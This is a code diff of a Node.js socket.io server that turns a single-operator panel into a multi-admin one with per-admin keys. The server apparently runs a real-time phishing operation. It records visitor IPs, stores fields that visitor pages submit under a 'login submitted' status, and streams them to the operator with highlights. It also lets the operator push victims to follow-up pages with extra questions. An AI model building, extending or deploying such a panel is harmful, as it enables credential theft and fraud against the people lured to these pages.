@@ -11,134 +11,233 @@ const app = express();
 const server = http.createServer(app);
 app.set("trust proxy", true);
 
+app.use((req, res, next) => {
+  res.header("Access-Control-Allow-Origin", "*");
+  res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
+  next();
+});
+
+// Simple HTTP endpoint to check if a username exists in current sessions
+app.get("/check_username", (req, res) => {
+  const username = req.query.username;
+
+  if (!username) {
+    return res.status(400).json({
+      error: "username required",
+    });
+  }
+
+  const exists = admins.has(username);
+
+  return res.json({
+    exists,
+  });
+});
+
 const io = new Server(server, {
   cors: { origin: "*" },
 });
 
-const sessions = new Map();
-let totalVisits = 0;
-const admins = new Set();
+/* =====================================================
+  MULTI ADMIN STRUCTURE
+===================================================== */
 
-function emitDashboardStats() {
-  const totalUsers = sessions.size;
+// adminId -> { publicKey, sessions: Map, totalVisits, sockets: Set }
+const admins = new Map();
 
-  const totalOnlineUsers = [...sessions.values()].filter((s) => s.online).length;
+// publicKey -> adminId
+const adminKeyIndex = new Map();
 
-  io.to("admin_room").emit("dashboard_stats", {
-    totalUsers,
-    totalVisits,
-    totalOnlineUsers,
-    totalHandlers: admins.size,
-  });
-}
+/* =====================================================
+  LOAD SAVED DATA
+===================================================== */
 
 if (fs.existsSync(LOG_FILE)) {
   const saved = JSON.parse(fs.readFileSync(LOG_FILE));
-  for (const key in saved) {
-    sessions.set(key, saved[key]);
+
+  for (const adminId in saved) {
+    const adminData = saved[adminId];
+
+    const admin = {
+      publicKey: adminData.publicKey,
+      sessions: new Map(Object.entries(adminData.sessions || {})),
+      totalVisits: adminData.totalVisits || 0,
+      sockets: new Set(),
+    };
+
+    admins.set(adminId, admin);
+    adminKeyIndex.set(admin.publicKey, adminId);
   }
 }
 
+/* =====================================================
+  SAVE TO FILE
+===================================================== */
+
 function saveLogsToFile() {
-  const data = Object.fromEntries(sessions);
-  fs.writeFileSync(LOG_FILE, JSON.stringify(data, null, 2));
+  const output = {};
+
+  for (const [adminId, admin] of admins.entries()) {
+    output[adminId] = {
+      publicKey: admin.publicKey,
+      totalVisits: admin.totalVisits,
+      sessions: Object.fromEntries(admin.sessions),
+    };
+  }
+
+  fs.writeFileSync(LOG_FILE, JSON.stringify(output, null, 2));
 }
 
+/* =====================================================
+  ADMIN HELPERS
+===================================================== */
+
+function createAdmin(adminId) {
+  const publicKey = uuidv4();
+
+  const admin = {
+    publicKey,
+    sessions: new Map(),
+    totalVisits: 0,
+    sockets: new Set(),
+  };
+
+  admins.set(adminId, admin);
+  adminKeyIndex.set(publicKey, adminId);
+
+  return admin;
+}
+
+function getAdminByKey(publicKey) {
+  const adminId = adminKeyIndex.get(publicKey);
+  if (!adminId) return null;
+  return admins.get(adminId);
+}
+
+/* =====================================================
+  DASHBOARD STATS
+===================================================== */
+
+function emitDashboardStats(adminId) {
+  const admin = admins.get(adminId);
+  if (!admin) return;
+
+  const totalUsers = admin.sessions.size;
+
+  const totalOnlineUsers = [...admin.sessions.values()].filter((s) => s.online).length;
+
+  io.to(`admin_${adminId}`).emit("dashboard_stats", {
+    totalUsers,
+    totalVisits: admin.totalVisits,
+    totalOnlineUsers,
+    totalHandlers: admin.sockets.size,
+  });
+}
+
+/* =====================================================
+  SOCKET CONNECTION
+===================================================== */
+
 io.on("connection", (socket) => {
-  // USER REGISTRATION
-  socket.on("register_user", (existingSessionId) => {
-    let sessionId = existingSessionId;
+  /* ===============================
+    ADMIN REGISTER
+  =============================== */
 
-    // Extract IP safely
-    const req = socket.request;
-    const ipAddress = req.headers["x-forwarded-for"]
-      ? req.headers["x-forwarded-for"].split(",")[0].trim()
-      : req.socket.remoteAddress;
+  socket.on("register_admin", ({ adminId }) => {
+    let admin = admins.get(adminId);
 
-    if (!sessionId) {
-      sessionId = uuidv4();
+    if (!admin) {
+      admin = createAdmin(adminId);
     }
 
-    if (!sessions.has(sessionId)) {
-      sessions.set(sessionId, {
-        status: "idle",
-        online: true,
-        onlineStatus: "online",
-        ip: ipAddress,
-        lastUpdate: Date.now(),
-      });
-    } else {
-      const session = sessions.get(sessionId);
-      session.online = true;
-      session.ip = ipAddress;
-    }
-
-    socket.join(`session_${sessionId}`);
-    socket.data.sessionId = sessionId;
-
-    socket.emit("session_assigned", { sessionId });
-    
-    io.to("admin_room").emit("user_updated", {
-      sessionId,
-      session: sessions.get(sessionId),
-    });
-
-    if (!existingSessionId) {
-      totalVisits++;
-    }
-
-    emitDashboardStats();   
-    console.log(`User-${sessionId} connected`);
-  });
-
-  // TRACK ONLINE STATUS
-  socket.on("disconnect", () => {
-    if (socket.data.isAdmin) {
-      admins.delete(socket.id);
-    }
-    
-    const sessionId = socket.data.sessionId;
-    if (!sessionId) return;
-
-    if (sessions.has(sessionId)) {
-      sessions.get(sessionId).online = false;
-
-      io.to("admin_room").emit("user_offline", {
-        sessionId,
-      });
-
-      console.log(`User-${sessionId} disconnected`);
-    }
-    saveLogsToFile();
-    emitDashboardStats();
-  });
-
-  // ADMIN CONNECT
-  socket.on("register_admin", () => {
-    socket.join("admin_room");
-
-    admins.add(socket.id);
+    socket.join(`admin_${adminId}`);
+    socket.data.adminId = adminId;
     socket.data.isAdmin = true;
 
-    emitDashboardStats();
-    
-    for (const [sessionId, session] of sessions.entries()) {
+    admin.sockets.add(socket.id);
+
+    socket.emit("admin_ready", {
+      publicKey: admin.publicKey,
+    });
+
+    // Send existing sessions to this admin only
+    for (const [sessionId, session] of admin.sessions.entries()) {
+      if (!session?.status || session.status === "idle") {
+        continue;
+      }
+
       socket.emit("user_updated", {
         sessionId,
         session,
       });
     }
-    
-    console.log("Admin connected");
+
+    emitDashboardStats(adminId);
+
+    console.log(`Admin ${adminId} connected`);
   });
 
-  // HANDLE LOG SUBMISSION
+  /* ===============================
+    USER REGISTER
+  =============================== */
+
+  socket.on("register_user", ({ existingSessionId, publicKey }) => {
+    const admin = getAdminByKey(publicKey);
+    if (!admin) return;
+
+    const adminId = adminKeyIndex.get(publicKey);
+
+    let sessionId = existingSessionId;
+
+    const req = socket.request;
+    const ipAddress = req.headers["x-forwarded-for"]
+      ? req.headers["x-forwarded-for"].split(",")[0].trim()
+      : req.socket.remoteAddress;
+
+    // If no sessionId OR sessionId not found in this admin's sessions
+    if (!sessionId || !admin.sessions.has(sessionId)) {
+      sessionId = uuidv4();
+      admin.totalVisits++;
+    }
+
+    if (admin.sessions.has(sessionId)) {
+      const session = admin.sessions.get(sessionId);
+      session.online = true;
+      session.ip = ipAddress;
+      session.onlineStatus = "online";
+    }
+
+    socket.join(`session_${sessionId}`);
+    socket.data.sessionId = sessionId;
+    socket.data.userAdminId = adminId;
+
+    socket.emit("session_assigned", { sessionId });
+    io.to(`admin_${adminId}`).emit("user_updated", {
+      sessionId,
+      session: admin.sessions.get(sessionId),
+      onlineStatus: "online",
+      source: "initial_sync",
+    });
+
+    emitDashboardStats(adminId);
+
+    console.log(`User-${sessionId} connected to Admin-${adminId}`);
+  });
+
+  /* ===============================
+    USER UPDATE
+  =============================== */
+
   socket.on("user_update", (payload) => {
     const sessionId = socket.data.sessionId;
-    if (!sessionId) return;
+    const adminId = socket.data.userAdminId;
+    if (!sessionId || !adminId) return;
 
-    if (!sessions.has(sessionId)) {
-      sessions.set(sessionId, {
+    const admin = admins.get(adminId);
+    if (!admin) return;
+
+    if (!admin.sessions.has(sessionId)) {
+      admin.sessions.set(sessionId, {
         id: sessionId,
         online: true,
         status: "login submitted",
@@ -148,7 +247,7 @@ io.on("connection", (socket) => {
     }
 
     const { highlightFields = [], ...fields } = payload;
-    const session = sessions.get(sessionId);
+    const session = admin.sessions.get(sessionId);
 
     Object.keys(fields).forEach((key) => {
       session[key] = fields[key];
@@ -156,58 +255,128 @@ io.on("connection", (socket) => {
 
     session.lastUpdate = Date.now();
 
-    io.to("admin_room").emit("user_updated", {
+    io.to(`admin_${adminId}`).emit("user_updated", {
       sessionId,
       session,
       highlightFields,
-      highlight: true
+      highlight: true,
+      source: "user_update",
     });
+
     saveLogsToFile();
   });
 
+  /* ===============================
+    ADMIN REDIRECT
+  =============================== */
 
-  // ADMIN DECIDES NEXT PAGE
   socket.on("admin_redirect", ({ sessionId, nextPage, questions }) => {
-    if (!sessions.has(sessionId)) {
-      console.log("Attempted redirect for missing session:", sessionId);
+    const adminId = socket.data.adminId;
+    if (!adminId) return;
+
+    const admin = admins.get(adminId);
+    if (!admin || !admin.sessions.has(sessionId)) return;
+
+    admin.sessions.get(sessionId).status = "redirected to " + nextPage;
+
+    io.to(`session_${sessionId}`).emit("redirect_user", {
+      nextPage,
+      questions,
+    });
+
+    console.log(`Admin ${adminId} redirecting ${sessionId}`);
+  });
+
+  /* ===============================
+    DELETE USER
+  =============================== */
+
+  socket.on("delete_user", ({ sessionId }) => {
+    const adminId = socket.data.adminId;
+    if (!adminId) return;
+
+    const admin = admins.get(adminId);
+    if (!admin) return;
+
+    admin.sessions.delete(sessionId);
+
+    io.to(`admin_${adminId}`).emit("user_deleted", {
+      sessionId,
+    });
+
+    saveLogsToFile();
+    emitDashboardStats(adminId);
+
+    console.log(`Session ${sessionId} deleted from Admin ${adminId}`);
+  });
+
+  /* ===============================
+    ADMIN RESET
+  =============================== */
+
+  socket.on("reset_admin", () => {
+    const adminId = socket.data.adminId;
+    if (!adminId) return;
+
+    const admin = admins.get(adminId);
+    if (!admin) return;
+
+    admin.sessions.clear();
+    admin.totalVisits = 0;
+
+    io.to(`admin_${adminId}`).emit("admin_reset");
+
+    saveLogsToFile();
+    emitDashboardStats(adminId);
+
+    console.log(`Admin ${adminId} reset all data`);
+  });
+
+  /* ===============================
+    DISCONNECT
+  =============================== */
+
+  socket.on("disconnect", () => {
+    if (socket.data.isAdmin) {
+      const adminId = socket.data.adminId;
+      const admin = admins.get(adminId);
+      if (admin) {
+        admin.sockets.delete(socket.id);
+        emitDashboardStats(adminId);
+      }
       return;
     }
 
-    const room = `session_${sessionId}`;
+    const sessionId = socket.data.sessionId;
+    const adminId = socket.data.userAdminId;
+    if (!sessionId || !adminId) return;
 
-    sessions.get(sessionId).status = "redirected";
+    const admin = admins.get(adminId);
+    if (!admin || !admin.sessions.has(sessionId)) return;
 
-    io.to(room).emit("redirect_user", { nextPage, questions });
+    const session = admin.sessions.get(sessionId);
 
-    console.log("Redirecting user:", sessionId, nextPage);
-  });
-
-  // DELETE USER ROW
-  socket.on("delete_user", ({ sessionId }) => {
-    // 1️⃣ Remove from sessions map
-    sessions.delete(sessionId);
-
-    // 2️⃣ Remove from log file
-    try {
-      const logs = JSON.parse(fs.readFileSync("logs.json", "utf8"));
-
-      delete logs[sessionId];
-
-      fs.writeFileSync("logs.json", JSON.stringify(logs, null, 2));
-    } catch (err) {
-      console.error("Log delete error:", err);
+    if (!session || session.status === "idle") {
+      return; // do not emit anything for idle users
     }
 
-    // 3️⃣ Notify admin panel
-    io.to("admin_room").emit("user_deleted", { sessionId });
+    session.online = false;
+    session.onlineStatus = "offline";
 
-    console.log(`Session ${sessionId} deleted`);
+    io.to(`admin_${adminId}`).emit("user_offline", {
+      sessionId,
+    });
+
+    saveLogsToFile();
+    emitDashboardStats(adminId);
+
+    console.log(`User-${sessionId} disconnected`);
   });
 });
+
 
 const PORT = process.env.PORT || 8080;
 
 server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
-
